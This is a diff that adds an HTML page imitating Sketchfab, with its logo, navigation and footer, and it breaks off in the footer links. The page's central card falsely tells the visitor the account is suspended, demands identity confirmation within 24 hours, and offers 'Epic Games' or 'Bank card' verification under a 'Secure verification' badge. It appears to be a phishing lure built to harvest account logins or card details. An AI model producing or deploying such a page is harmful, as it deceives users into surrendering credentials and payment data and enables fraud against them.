@@ -1,0 +1,823 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="theme-color" content="#ffffff">
+<title>Account suspended - Sketchfab</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  :root {
+    --skfb-blue: #1caad9;
+    --skfb-blue-dark: #1895bd;
+    --text: #2c2c2c;
+    --text-light: #888;
+    --border: #e5e5e5;
+    --bg-light: #f7f7f7;
+    --white: #ffffff;
+    --danger: #e53935;
+    --danger-dark: #c62828;
+  }
+
+  html { -webkit-text-size-adjust: 100%; }
+
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto,
+                 "Helvetica Neue", Arial, "Noto Sans", sans-serif,
+                 "Apple Color Emoji", "Segoe UI Emoji";
+    -webkit-font-smoothing: antialiased;
+    -moz-osx-font-smoothing: grayscale;
+    text-rendering: optimizeLegibility;
+    color: var(--text);
+    background: var(--white);
+    font-size: 14px;
+    line-height: 1.5;
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+  }
+
+  a { text-decoration: none; color: inherit; }
+  button { font-family: inherit; cursor: pointer; border: none; background: none; color: inherit; }
+  ul { list-style: none; }
+  svg { display: block; }
+
+  main { flex: 1; }
+
+  .c-page-header {
+    position: sticky;
+    top: 0;
+    background: var(--white);
+    border-bottom: 1px solid var(--border);
+    z-index: 100;
+    height: 60px;
+  }
+
+  .c-page-header__flex-container {
+    display: flex;
+    align-items: center;
+    height: 100%;
+    padding: 0 20px;
+    gap: 8px;
+  }
+
+  .c-page-header__menu-icon {
+    display: none;
+    align-items: center;
+    justify-content: center;
+    width: 40px;
+    height: 40px;
+    color: #555;
+    border-radius: 4px;
+    transition: background 0.15s;
+  }
+
+  .c-page-header__menu-icon:hover { background: var(--bg-light); }
+
+  .c-page-header__logo {
+    display: flex;
+    align-items: center;
+    margin-right: 12px;
+    flex-shrink: 0;
+  }
+
+  .svg-logo { height: 26px; width: auto; }
+
+  .c-navigation {
+    display: flex;
+    gap: 4px;
+    height: 100%;
+  }
+
+  .c-navigation__item {
+    display: flex;
+    align-items: center;
+    position: relative;
+  }
+
+  .c-navigation__link {
+    display: flex;
+    align-items: center;
+    height: 60px;
+    padding: 0 14px;
+    font-size: 12px;
+    font-weight: 700;
+    text-transform: uppercase;
+    letter-spacing: 0.3px;
+    color: #555;
+    transition: color 0.15s;
+  }
+
+  .c-navigation__link:hover { color: var(--skfb-blue); }
+
+  .c-search-bar {
+    flex: 1;
+    max-width: 640px;
+    margin: 0 12px;
+  }
+
+  .c-search-bar__box {
+    position: relative;
+    display: flex;
+    align-items: center;
+  }
+
+  .c-search-bar__icon {
+    position: absolute;
+    left: 13px;
+    color: #999;
+    pointer-events: none;
+  }
+
+  .c-search-bar__input {
+    width: 100%;
+    height: 38px;
+    padding: 0 40px 0 36px;
+    border: 1px solid var(--border);
+    border-radius: 4px;
+    background: var(--bg-light);
+    font-size: 13px;
+    font-family: inherit;
+    color: var(--text);
+    outline: none;
+    transition: all 0.15s;
+  }
+
+  .c-search-bar__input::placeholder { color: #aaa; }
+
+  .c-search-bar__input:focus {
+    background: var(--white);
+    border-color: var(--skfb-blue);
+    box-shadow: 0 0 0 3px rgba(28, 170, 217, 0.1);
+  }
+
+  .c-search-bar__hotkey {
+    position: absolute;
+    right: 12px;
+    color: #aaa;
+    font-size: 13px;
+    pointer-events: none;
+  }
+
+  .c-page-header__flex-container--right {
+    display: flex;
+    align-items: center;
+    gap: 6px;
+    margin-left: auto;
+  }
+
+  .c-page-header__action { position: relative; }
+
+  .c-page-header__action__icon-container {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    width: 40px;
+    height: 40px;
+    border-radius: 4px;
+    color: #555;
+    transition: background 0.15s;
+    position: relative;
+  }
+
+  .c-page-header__action__icon-container:hover { background: var(--bg-light); }
+
+  .c-page-header__action__count {
+    position: absolute;
+    top: 3px;
+    right: 3px;
+    background: var(--skfb-blue);
+    color: #fff;
+    font-size: 10px;
+    font-weight: 700;
+    min-width: 16px;
+    height: 16px;
+    border-radius: 8px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 0 4px;
+    border: 2px solid var(--white);
+    line-height: 1;
+  }
+
+  .btn-important {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    height: 40px;
+    padding: 0 16px;
+    background: #f5a623;
+    color: #fff;
+    font-size: 12px;
+    font-weight: 700;
+    text-transform: uppercase;
+    letter-spacing: 0.3px;
+    border-radius: 4px;
+    transition: background 0.15s;
+  }
+
+  .btn-important:hover { background: #e0951a; }
+
+  .btn-important svg { width: 15px; height: 15px; }
+
+ .c-user-menu {
+  display: none;
+}
+
+  .c-user-menu__info {
+    display: flex;
+    align-items: center;
+    padding: 0;
+    border-radius: 0;
+    transition: opacity 0.15s;
+  }
+
+  .c-user-menu__info:hover { opacity: 0.85; }
+
+  .c-user-menu__avatar {
+  width: 34px;
+  height: 34px;
+  border-radius: 0;
+  background: var(--skfb-blue);
+}
+
+  .suspended-wrapper {
+    max-width: 480px;
+    margin: 50px auto;
+    padding: 0 20px;
+    width: 100%;
+  }
+
+  .suspend-card {
+    background: var(--white);
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    padding: 32px 28px;
+    text-align: center;
+    box-shadow: 0 2px 12px rgba(0,0,0,0.04);
+  }
+
+  .suspend-icon {
+    width: 60px;
+    height: 60px;
+    margin: 0 auto 16px;
+    border-radius: 50%;
+    background: linear-gradient(135deg, #e53935, #c62828);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    color: #fff;
+    font-size: 34px;
+    font-weight: 700;
+    line-height: 1;
+    box-shadow: 0 6px 20px rgba(229, 57, 53, 0.25);
+  }
+
+  .suspend-title {
+    font-size: 22px;
+    font-weight: 700;
+    margin-bottom: 8px;
+    letter-spacing: -0.2px;
+  }
+
+  .suspend-subtitle {
+    font-size: 13px;
+    color: var(--text-light);
+    margin-bottom: 24px;
+    line-height: 1.55;
+  }
+
+  .verify-section-title {
+    font-size: 12px;
+    font-weight: 700;
+    text-transform: uppercase;
+    letter-spacing: 0.4px;
+    color: #555;
+    margin-bottom: 16px;
+  }
+
+  .verify-options {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 12px;
+    margin-bottom: 20px;
+  }
+
+  .verify-option {
+    position: relative;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 10px;
+    padding: 20px 12px;
+    border: 2px solid var(--border);
+    border-radius: 8px;
+    background: var(--white);
+    cursor: pointer;
+    transition: all 0.2s;
+    text-align: center;
+  }
+
+  .verify-option:hover {
+    border-color: #b5ddec;
+    transform: translateY(-2px);
+    box-shadow: 0 6px 20px rgba(28, 170, 217, 0.1);
+  }
+
+  .verify-option.selected {
+    border-color: var(--skfb-blue);
+    background: #f0faff;
+    box-shadow: 0 6px 20px rgba(28, 170, 217, 0.15);
+  }
+
+  .verify-option__check {
+    position: absolute;
+    top: 8px;
+    right: 8px;
+    width: 20px;
+    height: 20px;
+    border-radius: 50%;
+    background: var(--skfb-blue);
+    color: #fff;
+    display: none;
+    align-items: center;
+    justify-content: center;
+  }
+
+  .verify-option__check svg { width: 11px; height: 11px; }
+
+  .verify-option.selected .verify-option__check { display: flex; }
+
+  .verify-option__icon {
+    width: 52px;
+    height: 52px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+  }
+
+  .verify-option__icon svg { width: 100%; height: 100%; }
+
+  .verify-option__title {
+    font-size: 13px;
+    font-weight: 700;
+    color: var(--text);
+    line-height: 1.3;
+  }
+
+  .verify-submit {
+    width: 100%;
+    height: 46px;
+    background: var(--skfb-blue);
+    color: #fff;
+    font-size: 13px;
+    font-weight: 700;
+    text-transform: uppercase;
+    letter-spacing: 0.4px;
+    border-radius: 6px;
+    transition: all 0.15s;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 10px;
+  }
+
+  .verify-submit:hover:not(:disabled) { background: var(--skfb-blue-dark); }
+
+  .verify-submit:disabled {
+    background: #ccc;
+    cursor: not-allowed;
+  }
+
+  .verify-submit svg { width: 16px; height: 16px; }
+
+  .secure-note {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 6px;
+    margin-top: 16px;
+    font-size: 11px;
+    color: var(--text-light);
+  }
+
+  .secure-note svg { width: 12px; height: 12px; color: var(--skfb-blue); }
+
+  .main-footer {
+    border-top: 1px solid var(--border);
+    background: var(--white);
+    padding: 48px 0 24px;
+    margin-top: 60px;
+  }
+
+  .main-footer .container {
+    max-width: 1400px;
+    margin: 0 auto;
+    padding: 0 20px;
+  }
+
+  .main-footer__navigation {
+    display: grid;
+    grid-template-columns: repeat(4, 1fr);
+    gap: 40px;
+    margin-bottom: 40px;
+  }
+
+  .main-footer__title {
+    display: block;
+    font-size: 11px;
+    font-weight: 700;
+    text-transform: uppercase;
+    letter-spacing: 0.8px;
+    color: var(--text);
+    margin-bottom: 14px;
+  }
+
+  .main-footer__links {
+    display: flex;
+    flex-direction: column;
+    gap: 8px;
+  }
+
+  .main-footer__link a {
+    font-size: 13px;
+    color: #666;
+    transition: color 0.15s;
+  }
+
+  .main-footer__link a:hover { color: var(--skfb-blue); }
+
+  .main-footer__button {
+    display: inline-block;
+    margin-top: 8px;
+    padding: 8px 16px;
+    background: var(--skfb-blue);
+    color: #fff !important;
+    border-radius: 4px;
+    font-weight: 600;
+    font-size: 13px;
+  }
+
+  .main-footer__button:hover { background: var(--skfb-blue-dark); }
+
+  .main-footer__copyrights-container {
+    border-top: 1px solid var(--border);
+    padding-top: 24px;
+  }
+
+  .main-footer__copyrights {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    font-size: 12px;
+    color: #999;
+    margin-bottom: 16px;
+    flex-wrap: wrap;
+  }
+
+  .main-footer__logo { height: 22px; width: auto; }
+
+  .main-footer__copyrights-links {
+    display: flex;
+    gap: 16px;
+    font-size: 12px;
+    margin-bottom: 16px;
+    flex-wrap: wrap;
+  }
+
+  .main-footer__copyrights-links a { color: #666; }
+  .main-footer__copyrights-links a:hover { color: var(--skfb-blue); }
+
+  .main-footer__social-links {
+    display: flex;
+    gap: 16px;
+  }
+
+  .main-footer__social-links a {
+    color: #999;
+    transition: color 0.15s;
+    display: flex;
+    align-items: center;
+  }
+
+  .main-footer__social-links a:hover { color: var(--skfb-blue); }
+
+  .main-footer__social-links svg { width: 18px; height: 18px; }
+
+  @media (max-width: 900px) {
+    .c-navigation { display: none; }
+    .c-page-header__menu-icon { display: flex; }
+    .c-search-bar { display: none; }
+    .main-footer__navigation {
+      grid-template-columns: repeat(2, 1fr);
+      gap: 30px;
+    }
+  }
+
+  @media (max-width: 600px) {
+    .c-page-header__flex-container { padding: 0 12px; }
+    .btn-important span { display: none; }
+    .btn-important { padding: 0 12px; }
+    .main-footer__navigation { grid-template-columns: 1fr; }
+    .suspend-card { padding: 24px 20px; }
+    .verify-options { grid-template-columns: 1fr; }
+  }
+</style>
+</head>
+<body>
+
+<header class="c-page-header">
+  <div class="c-page-header__flex-container">
+
+    <button class="c-page-header__menu-icon" aria-label="navigation">
+      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round">
+        <line x1="3" y1="6" x2="21" y2="6"/>
+        <line x1="3" y1="12" x2="21" y2="12"/>
+        <line x1="3" y1="18" x2="21" y2="18"/>
+      </svg>
+    </button>
+
+    <a href="#" class="c-page-header__logo" aria-label="Go to the mainpage">
+      <svg class="svg-logo" viewBox="0 0 121 25" xmlns="http://www.w3.org/2000/svg">
+        <g class="logo-text">
+          <path fill="#555555" d="M36.471,7.719c-1.526,0-2.289,0.504-2.289,1.512c0,0.448,0.189,0.791,0.567,1.029 c0.378,0.238,1.263,0.582,2.656,1.029c1.393,0.448,2.37,0.956,2.93,1.522c0.56,0.567,0.84,1.438,0.84,2.615 c0,1.498-0.455,2.632-1.365,3.401c-0.911,0.771-2.1,1.155-3.57,1.155c-1.092,0-2.429-0.168-4.011-0.504l-0.756-0.147l0.294-2.247 c1.876,0.253,3.311,0.379,4.305,0.379c1.484,0,2.226-0.616,2.226-1.849c0-0.447-0.171-0.798-0.515-1.05s-1.025-0.525-2.047-0.819 c-1.624-0.462-2.769-1.011-3.434-1.648s-0.998-1.522-0.998-2.657c0-1.428,0.434-2.492,1.302-3.192c0.868-0.7,2.058-1.05,3.57-1.05 c1.036,0,2.352,0.14,3.948,0.42l0.756,0.147L40.65,8.056C38.676,7.832,37.283,7.719,36.471,7.719z"/>
+          <path fill="#555555" d="M46.068,19.731h-2.814v-14.7h2.814v8.358l1.071-0.189l2.079-3.969h3.15l-2.73,4.977l2.877,5.523h-3.171 l-2.121-4.095l-1.155,0.188V19.731z"/>
+          <path fill="#555555" d="M56.705,17.075c0.329,0.287,0.801,0.431,1.417,0.431c1.302,0,2.464-0.042,3.486-0.126l0.589-0.063 l0.041,2.079c-1.61,0.392-3.066,0.588-4.368,0.588c-1.582,0-2.73-0.42-3.444-1.26c-0.714-0.84-1.071-2.205-1.071-4.095 c0-3.766,1.547-5.649,4.641-5.649c3.052,0,4.578,1.582,4.578,4.746l-0.209,1.953H56.19C56.204,16.322,56.375,16.788,56.705,17.075z M59.802,13.536c0-0.84-0.133-1.424-0.399-1.753c-0.266-0.329-0.732-0.493-1.396-0.493c-0.666,0-1.134,0.171-1.407,0.514 c-0.273,0.343-0.417,0.921-0.431,1.732H59.802z"/>
+          <path fill="#555555" d="M70.407,11.625h-2.583v4.305c0,0.42,0.011,0.718,0.031,0.893c0.021,0.175,0.098,0.325,0.231,0.451 c0.133,0.126,0.339,0.189,0.619,0.189l1.596-0.042l0.126,2.246c-0.938,0.211-1.651,0.315-2.142,0.315 c-1.26,0-2.121-0.283-2.583-0.851c-0.462-0.566-0.693-1.613-0.693-3.14v-4.368h-1.238V9.231h1.238V6.312h2.814v2.919h2.583V11.625z"/>
+          <path fill="#555555" d="M76.161,8.979c0.729,0,1.659,0.112,2.794,0.336l0.566,0.126l-0.084,2.226 c-1.106-0.112-1.925-0.168-2.457-0.168c-0.966,0-1.606,0.207-1.921,0.62c-0.315,0.413-0.473,1.193-0.473,2.341 c0,1.148,0.157,1.937,0.473,2.363c0.314,0.427,0.962,0.641,1.942,0.641l2.436-0.168l0.084,2.246 c-1.498,0.295-2.639,0.441-3.423,0.441c-1.554,0-2.671-0.438-3.35-1.312s-1.019-2.278-1.019-4.211c0-1.932,0.35-3.328,1.05-4.189 S74.607,8.979,76.161,8.979z"/>
+          <path fill="#555555" d="M84.414,19.731H81.6v-14.7h2.814v4.704c0.966-0.504,1.834-0.756,2.604-0.756c1.4,0,2.366,0.413,2.898,1.239 c0.531,0.826,0.798,2.1,0.798,3.822v5.691h-2.814v-5.628c0-0.882-0.104-1.536-0.314-1.963s-0.63-0.641-1.26-0.641 c-0.546,0-1.093,0.084-1.639,0.252l-0.272,0.084V19.731z"/>
+          <path fill="#555555" d="M96.531,11.625v8.106h-2.814v-8.106h-1.134V9.231h1.134V8.77c0-1.512,0.224-2.555,0.672-3.129 s1.246-0.861,2.395-0.861c0.504,0,1.155,0.07,1.953,0.21l0.44,0.063l-0.042,2.289c-0.616-0.028-1.134-0.042-1.554-0.042 s-0.7,0.112-0.84,0.336c-0.141,0.224-0.21,0.609-0.21,1.155v0.441h2.541v2.394H96.531z"/>
+          <path fill="#555555" d="M108.753,12.507v4.368c0.028,0.337,0.084,0.571,0.168,0.704s0.259,0.228,0.525,0.283l-0.084,2.121 c-0.714,0-1.285-0.049-1.712-0.146c-0.427-0.099-0.857-0.295-1.291-0.589c-1.008,0.49-2.037,0.735-3.087,0.735 c-2.171,0-3.255-1.147-3.255-3.444c0-1.119,0.301-1.914,0.902-2.383c0.603-0.469,1.526-0.746,2.772-0.83l2.247-0.168v-0.651 c0-0.434-0.099-0.731-0.294-0.893c-0.196-0.161-0.512-0.241-0.945-0.241l-3.948,0.168l-0.084-1.953 c1.498-0.406,2.923-0.609,4.273-0.609c1.352,0,2.324,0.28,2.919,0.84C108.456,10.379,108.753,11.276,108.753,12.507z M104.028,15.279c-0.784,0.07-1.176,0.49-1.176,1.26c0,0.771,0.343,1.155,1.028,1.155c0.532,0,1.113-0.084,1.743-0.252l0.315-0.084 v-2.247L104.028,15.279z"/>
+          <path fill="#555555" d="M116.522,8.979c1.47,0,2.545,0.402,3.224,1.208s1.019,2.244,1.019,4.316c0,2.071-0.392,3.503-1.176,4.294 s-2.136,1.187-4.053,1.187c-0.603,0-1.701-0.07-3.298-0.21l-0.798-0.084V5.031h2.814v4.515 C115.15,9.168,115.906,8.979,116.522,8.979z M115.536,17.464c0.938,0,1.567-0.228,1.89-0.683s0.482-1.271,0.482-2.447 c0-1.89-0.588-2.834-1.764-2.834c-0.56,0-1.092,0.07-1.596,0.21l-0.294,0.063v5.607C114.898,17.436,115.325,17.464,115.536,17.464z"/>
+        </g>
+        <g class="logo-circle">
+          <path fill="#1caad9" d="M12.5-0.029C5.596-0.029,0,5.568,0,12.472c0,6.904,5.596,12.501,12.5,12.501s12.5-5.597,12.5-12.501 C25.001,5.568,19.405-0.029,12.5-0.029z M11.414,19.911L6.025,16.8v-6.276l5.389,2.911V19.911z M12.374,11.958l-6.376-3.38 l6.376-3.682l6.377,3.682L12.374,11.958z M18.755,16.812l-5.369,3.1v-6.452l5.369-2.901V16.812z"/>
+        </g>
+      </svg>
+    </a>
+
+    <ul class="c-navigation">
+      <li class="c-navigation__item">
+        <a href="#" class="c-navigation__link">Explore</a>
+      </li>
+      <li class="c-navigation__item">
+        <a href="#" class="c-navigation__link">For business</a>
+      </li>
+    </ul>
+
+    <form class="c-search-bar" onsubmit="return false;">
+      <div class="c-search-bar__box">
+        <span class="c-search-bar__icon">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <circle cx="11" cy="11" r="7"/>
+            <line x1="21" y1="21" x2="16.65" y2="16.65"/>
+          </svg>
+        </span>
+        <input type="text" class="c-search-bar__input" placeholder="Search 3D models" aria-label="Search">
+        <div class="c-search-bar__hotkey">/</div>
+      </div>
+    </form>
+
+    <div class="c-page-header__flex-container--right">
+
+      <div class="c-page-header__action">
+        <a href="https://sketchfab.com/signup?next=%2Ffeed%23upload" class="c-page-header__action__icon-container" aria-label="Notifications">
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"/>
+            <path d="M13.73 21a2 2 0 0 1-3.46 0"/>
+          </svg>
+          <div class="c-page-header__action__count">1</div>
+        </a>
+      </div>
+
+      <a href="#" class="btn-important">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/>
+          <polyline points="17 8 12 3 7 8"/>
+          <line x1="12" y1="3" x2="12" y2="15"/>
+        </svg>
+        <span>Upload</span>
+      </a>
+
+      <div class="c-user-menu">
+        <a href="https://sketchfab.com/fsdjkfas" class="c-user-menu__info" aria-label="Profile">
+          <div class="c-user-menu__avatar"></div>
+        </a>
+      </div>
+
+    </div>
+  </div>
+</header>
+
+<main>
+  <div class="suspended-wrapper">
+    <div class="suspend-card">
+
+      <div class="suspend-icon">!</div>
+
+      <h1 class="suspend-title">Account suspended</h1>
+      <p class="suspend-subtitle">
+        Your account has been temporarily suspended.<br>
+        Please confirm your identity within 24 hours.
+      </p>
+
+      <h2 class="verify-section-title">Verify with</h2>
+
+      <div class="verify-options">
+
+        <button class="verify-option" data-method="epic">
+          <div class="verify-option__check">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
+              <polyline points="20 6 9 17 4 12"/>
+            </svg>
+          </div>
+          <div class="verify-option__icon">
+            <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+              <path fill="#313131" d="M3.537 0C2.165 0 1.66.506 1.66 1.879V18.44a4.262 4.262 0 00.02.433c.031.3.037.59.316.92.027.033.311.245.311.245.153.075.258.13.43.2l8.335 3.491c.433.199.614.276.928.27h.002c.314.006.495-.071.928-.27l8.335-3.492c.172-.07.277-.124.43-.2 0 0 .284-.211.311-.243.28-.33.285-.621.316-.92a4.261 4.261 0 00.02-.434V1.879c0-1.373-.506-1.88-1.878-1.88zm13.366 3.11h.68c1.138 0 1.688.553 1.688 1.696v1.88h-1.374v-1.8c0-.369-.17-.54-.523-.54h-.235c-.367 0-.537.17-.537.539v5.81c0 .369.17.54.537.54h.262c.353 0 .523-.171.523-.54V8.619h1.373v2.143c0 1.144-.562 1.71-1.7 1.71h-.694c-1.138 0-1.7-.566-1.7-1.71V4.82c0-1.144.562-1.709 1.7-1.709zm-12.186.08h3.114v1.274H6.117v2.603h1.648v1.275H6.117v2.774h1.74v1.275h-3.14zm3.816 0h2.198c1.138 0 1.7.564 1.7 1.708v2.445c0 1.144-.562 1.71-1.7 1.71h-.799v3.338h-1.4zm4.53 0h1.4v9.201h-1.4zm-3.13 1.235v3.392h.575c.354 0 .523-.171.523-.54V4.965c0-.368-.17-.54-.523-.54z"/>
+            </svg>
+          </div>
+          <div class="verify-option__title">Epic Games</div>
+        </button>
+
+        <button class="verify-option" data-method="card">
+          <div class="verify-option__check">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
+              <polyline points="20 6 9 17 4 12"/>
+            </svg>
+          </div>
+          <div class="verify-option__icon">
+            <svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+              <defs>
+                <linearGradient id="cardGrad" x1="0" y1="0" x2="1" y2="1">
+                  <stop offset="0%" stop-color="#1caad9"/>
+                  <stop offset="100%" stop-color="#0e6f8f"/>
+                </linearGradient>
+              </defs>
+              <rect x="3" y="6" width="26" height="20" rx="3" fill="url(#cardGrad)"/>
+              <rect x="6.5" y="11" width="5" height="4" rx="1" fill="#f5c56b"/>
+              <rect x="7.2" y="12.2" width="1" height="1.6" fill="#c79a3a"/>
+              <rect x="9.8" y="12.2" width="1" height="1.6" fill="#c79a3a"/>
+              <rect x="3" y="17" width="26" height="2.2" fill="rgba(0,0,0,0.25)"/>
+              <rect x="6.5" y="20.5" width="9" height="1.6" rx="0.8" fill="#ffffff" opacity="0.9"/>
+              <rect x="6.5" y="23" width="6" height="1.3" rx="0.65" fill="#ffffff" opacity="0.6"/>
+              <circle cx="23.5" cy="22" r="2.2" fill="#ffffff" opacity="0.85"/>
+              <circle cx="26" cy="22" r="2.2" fill="#ffd166" opacity="0.9"/>
+            </svg>
+          </div>
+          <div class="verify-option__title">Bank card</div>
+        </button>
+
+      </div>
+
+      <button class="verify-submit" id="verifyBtn" disabled>
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+        </svg>
+        <span id="verifyBtnText">Select a method</span>
+      </button>
+
+      <div class="secure-note">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+          <rect x="3" y="11" width="18" height="11" rx="2"/>
+          <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
+        </svg>
+        Secure verification · Encrypted connection
+      </div>
+
+    </div>
+  </div>
+</main>
+
+<footer class="main-footer">
+  <div class="container">
+    <nav class="main-footer__navigation">
+
+      <div class="main-footer__col">
+        <span class="main-footer__title">Enterprise</span>
+        <ul class="main-footer__links">
+          <li class="main-footer__link"><a href="#">Enterprise Solutions</a></li>
+          <li class="main-footer__link"><a href="#">3D Configurators</a></li>
+          <li class="main-footer__link"><a href="#">3D eCommerce</a></li>
+          <li class="main-footer__link"><a href="#">3D Viewer</a></li>
+          <li class="main-footer__link"><a href="#">3D Advertising</a></li>
+          <li class="main-footer__link"><a href="#">Sketchfab for Teams</a></li>
+          <li class="main-footer__link"><a href="#">Pricing</a></li>
+        </ul>
+      </div>
+
+      <div class="main-footer__col">
+        <span class="main-footer__title">Ecosystem</span>
+        <ul class="main-footer__links">
+          <li class="main-footer__link"><a href="#">Exporters</a></li>
+          <li class="main-footer__link"><a href="#">Importers</a></li>
+          <li class="main-footer__link"><a href="#">Developers & API</a></li>
+          <li class="main-footer__link"><a href="#">Augmented Reality</a></li>
+          <li class="main-footer__link"><a href="#">Virtual Reality</a></li>
+          <li class="main-footer__link"><a href="#">Free 3D Models</a></li>
+        </ul>
+      </div>
+
+      <div class="main-footer__col">
+        <span class="main-footer__title">Community</span>
+        <ul class="main-footer__links">
+          <li class="main-footer__link"><a href="#">Explore</a></li>
+          <li class="main-footer__link"><a href="#">Help Center</a></li>
+          <li class="main-footer__link"><a href="#">Education</a></li>
+          <li class="main-footer__link"><a href="#">Museums</a></li>
+          <li class="main-footer__link"><a href="#">Blog</a></li>
+          <li class="main-footer__link"><a href="#">Sketchfab Masters</a></li>
+        </ul>
+      </div>
+
+      <div class="main-footer__col">
+        <span class="main-footer__title">About</span>
+        <ul class="main-footer__links">
+          <li class="main-footer__link"><a href="#">Company</a></li>
+          <li class="main-footer__link"><a href="#">Careers</a></li>
+          <li class="main-footer__link"><a href="#">Press Kit</a></li>
+          <li class="main-footer__link"><a href="#">Features</a></li>
+          <li class="main-footer__link"><a href="#" class="main-footer__button">Contact us</a></li>
+        </ul>
+      </div>
+
+    </nav>
+
+    <div class="main-footer__copyrights-container">
+
+      <div class="main-footer__copyrights">
+        <svg class="main-footer__logo" viewBox="0 0 25 25" xmlns="http://www.w3.org/2000/svg">
+          <path fill="#1caad9" d="M12.5-0.029C5.596-0.029,0,5.568,0,12.472c0,6.904,5.596,12.501,12.5,12.501s12.5-5.597,12.5-12.501 C25.001,5.568,19.405-0.029,12.5-0.029z M11.414,19.911L6.025,16.8v-6.276l5.389,2.911V19.911z M12.374,11.958l-6.376-3.38 l6.376-3.682l6.377,3.682L12.374,11.958z M18.755,16.812l-5.369,3.1v-6.452l5.369-2.901V16.812z"/>
+        </svg>
+        <span>© 2026, KitBash SF Operations LLC. All rights reserved.</span>
+      </div>
+
+      <div class="main-footer__copyrights-links">
+        <a href="#">Terms of use</a>
+        <a href="#">Privacy policy</a>
+        <a href="#">Sitemap</a>
+      </div>
+
+      <div class="main-footer__social-links">
+        <a href="#" aria-label="X">
+          <svg viewBox="0 0 24 24" fill="currentColor"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231 5.45-6.231Zm-1.161 17.52h1.833L7.084 4.126H5.117L17.083 19.77Z"/></svg>
+        </a>
+        <a href="#" aria-label="Instagram">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <rect x="2" y="2" width="20" height="20" rx="5"/>
+            <circle cx="12" cy="12" r="4"/>
+            <circle cx="17.5" cy="6.5" r="1" fill="currentColor" stroke="none"/>
+          </svg>
+        </a>
+        <a href="#" aria-label="Facebook">
+          <svg viewBox="0 0 24 24" fill="currentColor"><path d="M13.5 21v-8h2.7l.4-3.1h-3.1V7.9c0-.9.25-1.5 1.55-1.5h1.65V3.6c-.3-.04-1.3-.13-2.47-.13-2.44 0-4.11 1.49-4.11 4.23v2.2H7.4V13h2.7v8h3.4Z"/></svg>
+        </a>
+        <a href="#" aria-label="Discord">
+          <svg viewBox="0 0 24 24" fill="currentColor"><path d="M20.3 4.6A19 19 0 0 0 15.6 3l-.3.6a17.5 17.5 0 0 1 4.2 1.4 15 15 0 0 0-15 0A17.5 17.5 0 0 1 8.7 3.6L8.4 3A19 19 0 0 0 3.7 4.6C.9 8.8.1 13 0.5 17a19 19 0 0 0 5.8 3l.5-.7a12 12 0 0 1-2-1c.2-.2.4-.3.5-.5a13.7 13.7 0 0 0 11.4 0l.5.5c-.6.4-1.3.7-2 1l.5.7a19 19 0 0 0 5.8-3c.5-4.6-.8-8.8-3.2-12.4ZM8.4 14.5c-1.1 0-2-1-2-2.3s.9-2.3 2-2.3 2 1 2 2.3-.9 2.3-2 2.3Zm7.2 0c-1.1 0-2-1-2-2.3s.9-2.3 2-2.3 2 1 2 2.3-.9 2.3-2 2.3Z"/></svg>
+        </a>
+        <a href="#" aria-label="Pinterest">
+          <svg viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.5 2 4 5.2 4 8.2c0 1.6.6 3 1.9 3.5.2.1.4 0 .5-.2l.2-.7c.1-.2 0-.3-.1-.5-.4-.5-.7-1.2-.7-2.2 0-2.8 2-5.3 5.4-5.3 2.9 0 4.6 1.8 4.6 4.2 0 3.1-1.4 5.8-3.4 5.8-1.1 0-2-1-1.7-2.1.3-1.4.9-2.9.9-3.9 0-.9-.5-1.6-1.5-1.6-1.2 0-2.1 1.2-2.1 2.8 0 1 .3 1.7.3 1.7l-1.4 5.9c-.4 1.8-.1 3.9 0 4.1 0 .1.2.2.3.1.1-.1 1.5-1.8 1.9-3.5.1-.5.8-3 .8-3 .4.7 1.5 1.4 2.6 1.4 3.5 0 5.8-3.2 5.8-7.4C19 5 16.5 2 12 2Z"/></svg>
+        </a>
+        <a href="#" aria-label="LinkedIn">
